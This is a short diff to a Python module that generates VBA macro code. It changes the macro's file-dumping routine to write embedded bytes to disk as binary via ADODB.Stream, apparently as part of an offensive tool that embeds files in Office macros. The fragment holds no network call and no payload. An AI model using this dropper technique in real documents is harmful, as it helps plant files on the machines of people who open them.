@@ -54,14 +54,15 @@ class Embedder(MpModule):
         packedFile += "End Sub \n"
         packedFile += " \n"
         packedFile += "Sub DumpFile(strFilename) \n"
-        packedFile += "\tDim objFSO \n"
-        packedFile += "\tDim objFile \n"
+        packedFile += "\tDim stream \n"
         packedFile += " \n"
-        packedFile += "\tSet objFSO = CreateObject(\"Scripting.FileSystemObject\") \n"
-        packedFile += "\tSet objFile = objFSO.OpenTextFile(strFilename, 2, true) \n"
+        packedFile += "\tSet stream = CreateObject(\"ADODB.Stream\") \n"
+        packedFile += "\tstream.Type = 1 \n"
+        packedFile += "\tstream.Open \n"
         for iIter in range(1, countSubs+1):
-            packedFile += "\tDumpFile%d objFile \n" % iIter
-        packedFile += "\tobjFile.Close \n"
+            packedFile += "\tDumpFile%d stream \n" % iIter
+        packedFile += "\tstream.saveToFile strFilename, 2 \n"
+        packedFile += "\tstream.Close \n"
         packedFile += "End Sub \n"
     
         newContent = WriteBytes.VBA + "\n"
